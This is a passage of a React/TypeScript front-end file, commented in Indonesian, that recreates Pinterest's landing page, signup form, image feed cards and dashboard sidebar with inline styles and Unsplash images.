                    "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Cozy cafe & coffee aesthetic", 
                  tags: "Lifestyle", 
                  pins: "142 Pins • 3d", 
                  imgs: [
                    "https://images.unsplash.com/photo-1501339847302-ac426a4a7cbb?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1541167760496-1628856ab772?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Streetwear summer inspiration", 
                  tags: "Style", 
                  pins: "53 Pins • 6d", 
                  imgs: [
                    "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1488161628813-04466f872be2?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Neon Tokyo street photography", 
                  tags: "Travel", 
                  pins: "210 Pins • 2mo", 
                  imgs: [
                    "https://images.unsplash.com/photo-1503899036084-c55cdd92da26?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1540959733332-eab4deabeeaf?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1493976040374-85c8e12f0c0e?w=200&auto=format&fit=crop&q=80"
                  ] 
                }
              ].map((card, i) => (
                <div key={i} style={{ flex: "0 0 310px", borderRadius: 24, overflow: "hidden", cursor: "pointer" }}>
                  <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr", gap: 2, height: 160, background: "#e9e9e9", borderRadius: 24, overflow: "hidden" }}>
                    <img src={card.imgs[0]} style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                    <div style={{ display: "grid", gridTemplateRows: "1fr 1fr", gap: 2 }}>
                      <img src={card.imgs[1]} style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                      <img src={card.imgs[2]} style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                    </div>
                  </div>
                  <div style={{ padding: "12px 4px 4px", textAlign: "left", whiteSpace: "normal" }}>
                    <h4 style={{ margin: "0 0 6px 0", fontSize: 16, fontWeight: 700, lineHeight: 1.2, color: "#111" }}>{card.title}</h4>
                    <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>
                      <span>{card.tags}</span>
                      <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#e60023", display: "inline-flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 8 }}>✓</span>
                      <span style={{ color: "#767676", fontWeight: 400 }}>+ 1</span>
                    </div>
                    <p style={{ margin: 0, fontSize: 13, color: "#767676" }}>{card.pins}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </section>

      {/* 5. OVERLAY SIGNUP */}
      <section style={{ 
        position: "relative", 
        minHeight: isMobile ? "100vh" : "780px", 
        display: "flex", 
        alignItems: "center", 
        justifyContent: isMobile ? "center" : "space-between", 
        padding: isMobile ? "60px 16px" : "60px 8% 60px 10%",
        overflow: "hidden",
        background: "#fff"
      }}>
        {/* Background Image (Sama untuk Desktop & Mobile) */}
        <div style={{
          position: "absolute",
          inset: 0,
          backgroundImage: `url(${image})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
          pointerEvents: "none",
          zIndex: 1
        }} />

        {/* Gradient Overlay (Sama untuk Desktop & Mobile) */}
        <div style={{ 
          position: "absolute", 
          inset: 0, 
          background: isMobile 
            ? "linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.6) 100%)" // Disesuaikan sedikit agar teks terbaca di mobile
            : "linear-gradient(to right, rgba(0,0,0,0.5) 0%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.4) 100%)", 
          zIndex: 2 
        }} />
        
        <div style={{ 
          position: "relative", 
          display: "flex", 
          flexDirection: isMobile ? "column" : "row", 
          flexWrap: "wrap", 
          alignItems: "center", 
          justifyContent: isMobile ? "center" : "space-between", 
          width: "100%", 
          gap: isMobile ? 32 : 40, 
          zIndex: 3 
        }}>
         <h2 style={{ 
  fontSize: isMobile ? "40px" : "72px", 
  fontWeight: 700, 
  color: "#fff", 
  textShadow: "0 4px 24px rgba(0,0,0,0.4)", 
  maxWidth: 450, 
  textAlign: isMobile ? "center" : "left", 
  margin: "0 0 24px 0", 
  lineHeight: "0.95", // Dibuat lebih rapat agar terlihat seperti di foto
  letterSpacing: isMobile ? "-1.5px" : "-2.5px" 
}}>
  {isMobile ? (
    <>
      Sign up to get <br />
      your ideas
    </>
  ) : (
    "Sign up to get your ideas"
  )}
</h2>
          <div style={{ 
            background: "#fff", 
            borderRadius: 32, 
            width: "100%", 
            maxWidth: isMobile ? 360 : 400, 
            boxShadow: "0 24px 60px rgba(0,0,0,0.35)", 
            textAlign: "center",
            overflow: "hidden", 
            display: "flex",
            flexDirection: "column"
          }}>
            <div style={{ padding: isMobile ? "32px 24px 24px" : "40px 32px 24px" }}>
              <h3 style={{ fontSize: isMobile ? 24 : 28, fontWeight: 700, margin: "0 0 6px 0", color: "#222", letterSpacing: "-0.5px" }}>
                Welcome to Pinterest
              </h3>
              <p style={{ fontSize: 14, color: "#111", margin: "0 0 24px 0", fontWeight: 400 }}>
                Find new ideas to try
              </p>
 
              <form 
                onSubmit={(e) => { 
                  e.preventDefault(); 
                  if (regEmail && regPassword) {
                    onDirectLogin(regEmail, regPassword); 
                  } else {
                    alert("Harap isi email dan password.");
                  }
                }} 
                style={{ display: "flex", flexDirection: "column", gap: 12, textAlign: "left" }}
              >
                <div>
                  <label style={{ fontSize: 13, fontWeight: 500, color: "#111", display: "block", marginBottom: 6 }}>Email</label>
                  <input 
                    type="email" 
                    placeholder="Email" 
                    value={regEmail}
                    onChange={(e) => setRegEmail(e.target.value)}
                    style={styles.input(!!regEmail, { borderRadius: 16, padding: "12px 14px", border: "1.5px solid #cdcdd1" })} 
                  />
                </div>

                <div>
                  <label style={{ fontSize: 13, fontWeight: 500, color: "#111", display: "block", marginBottom: 6 }}>Password</label>
                  <div style={{ position: "relative" }}>
                    <input 
                      type="password" 
                      placeholder="Create a password" 
                      value={regPassword}
                      onChange={(e) => setRegPassword(e.target.value)}
                      style={styles.input(!!regPassword, { borderRadius: 16, padding: "12px 14px", paddingRight: 40, border: "1.5px solid #cdcdd1" })} 
                    />
                    <div style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", color: "#111", display: "flex", alignItems: "center", opacity: 0.8 }}>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                      </svg>
                    </div>
                  </div>
                  <p style={{ margin: "6px 0 0 0", fontSize: 11, color: "#767676", fontWeight: 400 }}>Use 8 or more letters, numbers and symbols</p>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: 4, fontSize: 13, fontWeight: 600, color: "#111", marginTop: 2, cursor: "pointer" }}>
                  <span>Password tips</span>
                  <span style={{ fontSize: 12, color: "#111", fontWeight: "bold" }}>ⓘ</span>
                </div>

                <div>
                  <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 6, cursor: "pointer" }}>
                    <label style={{ fontSize: 13, fontWeight: 500, color: "#111", margin: 0 }}>Birthdate</label>
                    <span style={{ fontSize: 12, color: "#111", fontWeight: "bold" }}>ⓘ</span>
                  </div>
                  <input 
                    type="text" 
                    placeholder="mm/dd/yyyy" 
                    value={regDob}
                    onChange={(e) => setRegDob(e.target.value)}
                    style={styles.input(!!regDob, { borderRadius: 16, padding: "12px 14px", border: "1.5px solid #cdcdd1" })} 
                  />
                </div>

                <button type="submit" style={{ ...styles.submitButton(false), borderRadius: 24, marginTop: 4, padding: "12px" }}>
                  Continue
                </button>
              </form>

              <div style={{ display: "flex", alignItems: "center", gap: 12, margin: "14px 0", color: "#111", fontSize: 12, fontWeight: 700, justifyContent: "center" }}>
                OR
              </div>

              <button onClick={() => onNav("signup")} style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontSize: 15, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", gap: 10, cursor: "pointer", marginBottom: 16, color: "#111" }}>
                <svg width="20" height="20" viewBox="0 0 24 24">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" />
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
                </svg>
                Continue with Google
              </button>

              <p style={{ margin: "0 0 16px 0", fontSize: 10, color: "#555", lineHeight: 1.4, padding: "0 4px", fontWeight: 400 }}>
                By continuing, you agree to Pinterest's <span style={{ textDecoration: "underline", cursor: "pointer", color: "#111", fontWeight: 600 }}>Terms of Service</span> and acknowledge you've read our <span style={{ textDecoration: "underline", cursor: "pointer", color: "#111", fontWeight: 600 }}>Privacy Policy</span>. <span style={{ textDecoration: "underline", cursor: "pointer", color: "#111", fontWeight: 600 }}>Notice at collection</span>.
              </p>

              <p style={{ margin: 0, fontSize: 12, color: "#111", fontWeight: 500 }}>
                Already a member? <span onClick={() => onNav("login")} style={{ fontWeight: 700, cursor: "pointer", color: "#111", textDecoration: "underline" }}>Log in</span>
              </p>
            </div>

            <div style={{ background: "#e1e1e1", padding: "16px", fontSize: 14, fontWeight: 700, color: "#111", borderTop: "1px solid #cdcdd1", cursor: "pointer", marginTop: "auto" }}>
              Create a free business account
            </div>
          </div>
        </div>
      </section>

      {/* 6. BOTTOM FULL FOOTER */}
      <footer style={{ 
        background: "#000000", 
        padding: isMobile ? "40px 24px 100px 24px" : "80px 10% 40px 10%", 
        display: "flex", 
        flexDirection: isMobile ? "column" : "row",
        justifyContent: "space-between", 
        alignItems: "flex-start", 
        gap: isMobile ? "40px" : "0",
        color: "#ffffff",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
        boxSizing: "border-box" 
      }}>
        <div style={{ 
          display: "flex", 
          flexDirection: "column", 
          justifyContent: isMobile ? "flex-start" : "space-between", 
          height: isMobile ? "auto" : "180px", 
          gap: isMobile ? "12px" : "0", 
          textAlign: "left" 
        }}>
          {/* Tambahan Logo sesuai foto */}
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
            <img 
              src={favicon} 
              alt="Pinterest Logo" 
              style={{ width: "24px", height: "24px", borderRadius: "50%" }} 
            />
            <span style={{ fontSize: "20px", fontWeight: 700, letterSpacing: "-0.5px" }}>Pinterest</span>
          </div>
          <span style={{ fontSize: "11px", color: "#ffffff", fontWeight: 400, opacity: 0.8 }}>
            © 2026 Pinterest
          </span>
        </div>

        <div style={{ 
          display: "flex", 
          flexDirection: isMobile ? "column" : "row", 
          gap: isMobile ? "32px" : "80px", 
          textAlign: "left", 
          paddingTop: isMobile ? "0" : "10px" 
        }}>
          <div style={{ display: "flex", flexDirection: "column", gap: "14px", minWidth: "110px" }}>
            <span style={{ fontWeight: 700, color: "#ffffff", fontSize: "14px", letterSpacing: "-0.2px", marginBottom: "4px" }}>
              Get the app
            </span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>iOS</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Android</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "14px", minWidth: "120px" }}>
            <span style={{ fontWeight: 700, color: "#ffffff", fontSize: "14px", letterSpacing: "-0.2px", marginBottom: "4px" }}>
              Quick links
            </span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Explore</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Shop</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Users</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Collections</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Shopping</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Help Center</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "14px", minWidth: "130px" }}>
            <span style={{ fontWeight: 700, color: "#ffffff", fontSize: "14px", letterSpacing: "-0.2px", marginBottom: "4px" }}>
              Policies
            </span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Terms of service</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Privacy policy</span>
            <span style={{ cursor: "pointer", fontSize: "14px", color: "#ffffff", fontWeight: 400 }}>Non-user notice</span>
          </div>
        </div>
      </footer>

      {/* FIXED MOBILE BOTTOM NAVIGATION BAR WITH LABELS (Sesuai Gambar eac328) */}
      {isMobile && (
        <div style={{
          position: "fixed", bottom: 0, left: 0, right: 0, height: 62,
          background: "#ffffff", borderTop: "1px solid #e2e2e2",
          display: "flex", justifyContent: "space-around", alignItems: "center",
          zIndex: 160, paddingBottom: "env(safe-area-inset-bottom)", boxSizing: "border-box"
        }}>
          <button style={{ background: "none", border: "none", color: "#e60023", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, fontSize: 11, fontWeight: 700 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10" /><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z" fill="#fff"/></svg>
            Explore
          </button>
          <button style={{ background: "none", border: "none", color: "#767676", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, fontSize: 11, fontWeight: 500 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
            Planner
          </button>
          <button style={{ background: "none", border: "none", color: "#767676", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, fontSize: 11, fontWeight: 500 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
            Saved
          </button>
          <button style={{ background: "none", border: "none", color: "#767676", display: "flex", flexDirection: "column", alignItems: "center", gap: 2, fontSize: 11, fontWeight: 500 }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            Profile
          </button>
        </div>
      )}

      <style>{`
        .hide-scrollbar::-webkit-scrollbar {
          display: none;
        }
      `}</style>
    </div>
  );
}

function SignUpModal({ onClose }: { onClose: () => void }) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [dob, setDob] = useState("");

  // Tambahkan deteksi mobile
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  return (
    <div 
      style={{
        ...styles.modalOverlay,
        padding: isMobile ? 0 : 16, // Hilangkan padding overlay di mobile agar bisa full screen
        alignItems: isMobile ? "flex-end" : "center", // Geser ke bawah atau penuh di mobile
      }} 
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <div 
        style={{
          ...styles.modalCard,
          width: "100%",
          maxWidth: isMobile ? "100%" : 400,
          height: isMobile ? "100vh" : "auto", // Layar penuh di mobile
          borderRadius: isMobile ? 0 : 32, // Hilangkan border-radius di mobile
          padding: isMobile ? "40px 24px" : "44px 36px 32px",
          display: "flex",
          flexDirection: "column",
          justifyContent: "center", // Posisikan konten di tengah secara vertikal pada mobile
          overflowY: "auto"
        }}
      >
        <button onClick={onClose} style={{ position: "absolute", top: 16, right: 18, background: "none", border: "none", fontSize: 24, cursor: "pointer", color: "#767676" }}>✕</button>
        
        <div style={{ ...styles.logoContainer, margin: "0 auto 16px" }}>
          <div style={{ color: "#fff", fontWeight: "bold", fontSize: 22, fontFamily: "system-ui" }}>P</div>
        </div>
        
        <h2 style={{ fontSize: isMobile ? 22 : 24, fontWeight: 700, color: "#111", marginBottom: 24, letterSpacing: "-0.5px" }}>
          Welcome to Pinterest
        </h2>
        
        <form onSubmit={(e) => e.preventDefault()} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          <input 
            placeholder="Full name" 
            value={name} 
            onChange={(e) => setName(e.target.value)} 
            style={styles.input(!!name)} 
          />
          <input 
            type="email" 
            placeholder="Email" 
            value={email} 
            onChange={(e) => setEmail(e.target.value)} 
            style={styles.input(!!email)} 
          />
          <div style={{ position: "relative" }}>
            <input 
              type={showPw ? "text" : "password"} 
              placeholder="Create a password" 
              value={password} 
              onChange={(e) => setPassword(e.target.value)} 
              style={styles.input(!!password, { paddingRight: 56 })} 
            />
            <button 
              type="button" 
              onClick={() => setShowPw((v) => !v)} 
              style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#111", fontSize: 13, fontWeight: 700, opacity: 0.8 }}
            >
              {showPw ? "Hide" : "Show"}
            </button>
          </div>
          <div style={{ textAlign: "left" }}>
            <label style={{ fontSize: 13, color: "#111", display: "block", marginBottom: 6, fontWeight: 600 }}>Tanggal lahir</label>
            <input 
              type="date" 
              value={dob} 
              onChange={(e) => setDob(e.target.value)} 
              style={styles.input(!!dob)} 
            />
          </div>
          <button type="button" onClick={onClose} style={{ ...styles.submitButton(false), marginTop: 8 }}>
            Continue
          </button>
        </form>
      </div>
    </div>
  );
}

function FeedCard({ item }: { item: typeof feedItems[0] }) {
  const [hov, setHov] = useState(false);
  const [saved, setSaved] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleSave = (e: React.MouseEvent) => {
    e.stopPropagation();
    setSaved((v) => !v);
  };

  const handleDownload = async (e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      const res = await fetch(item.url);
      const blob = await res.blob();
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `${item.title || "pinterest-image"}.jpg`;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
    } catch {
      window.open(item.url, "_blank");
    }
  };

  const handleShare = async (e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(item.url);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      window.open(item.url, "_blank");
    }
  };

  return (
    <div 
      onMouseEnter={() => setHov(true)} 
      onMouseLeave={() => setHov(false)} 
      style={{ borderRadius: 24, overflow: "hidden", position: "relative", background: "#efefef", marginBottom: 14, cursor: "pointer" }}
    >
      <img 
        src={item.url} 
        alt="" 
        draggable={false}
        style={{ 
          width: "100%", 
          height: item.h || 280, 
          objectFit: "cover", 
          display: "block",
          pointerEvents: "none",
          userSelect: "none",
        }} 
      />

      {hov && (
        <>
          <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.15)", pointerEvents: "none" }} />

          <button 
            onClick={handleSave}
            style={{ 
              position: "absolute", top: 10, right: 10, 
              background: saved ? "#111" : "#e60023", color: "#fff", 
              border: "none", borderRadius: 22, 
              padding: "10px 16px", fontSize: 14, fontWeight: 700, 
              cursor: "pointer", 
              boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
              transition: "background 0.15s"
            }}
          >
            {saved ? "Tersimpan" : "Simpan"}
          </button>

          <div style={{ position: "absolute", bottom: 10, left: 10, display: "flex", gap: 6, alignItems: "center" }}>
            <button 
              onClick={handleShare}
              style={{ width: 32, height: 32, borderRadius: "50%", background: "#fff", border: "none", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", boxShadow: "0 2px 6px rgba(0,0,0,0.15)" }}
            >
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="18" cy="5" r="3" /><circle cx="6" cy="12" r="3" /><circle cx="18" cy="19" r="3" />
                <line x1="8.6" y1="10.6" x2="15.4" y2="6.4" /><line x1="8.6" y1="13.4" x2="15.4" y2="17.6" />
              </svg>
            </button>
            <button 
              onClick={(e) => e.stopPropagation()}
              style={{ width: 32, height: 32, borderRadius: "50%", background: "#fff", border: "none", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", boxShadow: "0 2px 6px rgba(0,0,0,0.15)" }}
            >
              <svg width="15" height="15" viewBox="0 0 24 24" fill="#111"><circle cx="5" cy="12" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="19" cy="12" r="2" /></svg>
            </button>
            {copied && (
              <span style={{ background: "#111", color: "#fff", fontSize: 11, fontWeight: 600, padding: "5px 10px", borderRadius: 12, whiteSpace: "nowrap" }}>
                Link disalin
              </span>
            )}
          </div>

          <button 
            onClick={handleDownload}
            style={{ position: "absolute", bottom: 10, right: 10, width: 32, height: 32, borderRadius: "50%", background: "#fff", border: "none", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", boxShadow: "0 2px 6px rgba(0,0,0,0.15)" }}
          >
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
              <polyline points="7 10 12 15 17 10" /><line x1="12" y1="15" x2="12" y2="3" />
            </svg>
          </button>
        </>
      )}
    </div>
  );
}

function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
  const [search, setSearch] = useState("");
  const [colCount, setColCount] = useState(4);
  const [isMobile, setIsMobile] = useState(false);
  const [hoveredIcon, setHoveredIcon] = useState<string | null>(null);
  const [hoveredLogo, setHoveredLogo] = useState(false);

  useEffect(() => {
    const handleResize = () => {
      const width = window.innerWidth;
      setIsMobile(width < 768);
      if (width < 480) setColCount(2);
      else if (width < 800) setColCount(3);
      else if (width < 1100) setColCount(4);
      else setColCount(5);
    };
    handleResize();
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const shuffledFeed = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
  const cols = useMemo(() => {
    const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
    shuffledFeed.forEach((item, i) => c[i % colCount].push(item));
    return c;
  }, [shuffledFeed, colCount]);

  const menuItems = [
    { id: "home", label: "Home", icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" /></svg>, isActive: true },
    { id: "explore", label: "Explore", icon: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10" /><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z" /></svg>, isActive: false },
    { id: "boards", label: "Your Boards", icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="7" height="9" rx="1.5" /><rect x="14" y="3" width="7" height="5" rx="1.5" /><rect x="14" y="12" width="7" height="9" rx="1.5" /><rect x="3" y="16" width="7" height="5" rx="1.5" /></svg>, isActive: false },
    { id: "create", label: "Create", icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="5" /><line x1="12" y1="8" x2="12" y2="16" /><line x1="8" y1="12" x2="16" y2="12"/></svg>, isActive: false },
    {
      id: "notifications",
      label: "Notifications",
      icon: (
        <div style={{ position: "relative", display: "inline-block" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path d="M13.73 21a2 2 0 0 1-3.46 0" /></svg>
          <div style={{ position: "absolute", top: 2, right: 2, width: 6, height: 6, background: "#e60023", borderRadius: "50%" }} />
        </div>
      ),
      isActive: false,
    },
    { id: "messages", label: "Messages", icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>, isActive: false },
  ];

  return (
    <div style={{ minHeight: "100vh", background: "#fff", color: "#111", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", display: "flex", flexDirection: "column" }}>
     {/* 1. SIDEBAR NAV (DESKTOP ONLY) */}
{!isMobile && (
  <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", zIndex: 110, borderRight: "1px solid #efefef" }}>
    <div onMouseEnter={() => setHoveredLogo(true)} onMouseLeave={() => setHoveredLogo(false)} style={{ width: "100%", padding: "0 10px", boxSizing: "border-box", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 24, position: "relative" }}>
      
    <div style={{ 
  width: 32, 
  height: 32, 
  borderRadius: "50%", 
  overflow: "hidden", 
  display: "flex", 
  alignItems: "center", 
  justifyContent: "center",
  background: "#e60023" // Tambahkan background ini sebagai cadangan warna merah
}}>
  <img 
    src={favicon} 
    alt="Pinterest Logo" 
    style={{ 
      width: "90%",  // Ubah jadi 100% agar memenuhi lingkaran
      height: "80%", // Ubah jadi 100% agar memenuhi lingkaran
      objectFit: "contain" // Gunakan 'contain' jika ingin seluruh logo terlihat tanpa terpotong
    }} 
  />
</div>

       {hoveredLogo && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", boxShadow: "0 4px 12px rgba(0,0,0,0.15)", zIndex: 120 }}>Home</div>}
    </div>

          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 30, width: "100%" }}>
            {menuItems.map((menu) => {
              const isHovered = hoveredIcon === menu.id;
              return (
                <div key={menu.id} style={{ position: "relative", display: "flex", alignItems: "center" }}>
                  <button onMouseEnter={() => setHoveredIcon(menu.id)} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: menu.isActive ? "#111" : isHovered ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: menu.isActive ? "#fff" : "#111", transition: "all 0.2s" }}>
                    {menu.icon}
                  </button>
                  {isHovered && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", zIndex: 120 }}>{menu.label}</div>}
                </div>
              );
            })}
          </div>

          <div style={{ marginTop: "auto", position: "relative", display: "flex", alignItems: "center" }}>
            <button onClick={onLogout} onMouseEnter={() => setHoveredIcon("logout")} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: hoveredIcon === "logout" ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: "#111", transition: "all 0.2s" }}>
